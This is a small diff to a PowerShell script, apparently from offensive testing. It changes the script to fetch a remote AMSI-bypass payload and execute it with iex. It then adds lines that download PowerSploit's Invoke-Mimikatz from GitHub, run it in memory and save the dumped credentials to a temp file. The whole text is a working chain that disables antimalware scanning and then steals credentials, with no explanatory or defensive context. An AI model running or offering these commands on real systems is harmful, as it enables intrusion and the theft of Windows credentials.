@@ -1,4 +1,6 @@
 $wc = New-Object System.Net.WebClient
 $wc.Encoding = [System.Text.Encoding]::UTF8
 $jonsbypass = $wc.DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage3.txt");
-$jonsbypass;
+iex $jonsbypass;
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
+Invoke-Mimikatz > c:\temp\ignore.txt
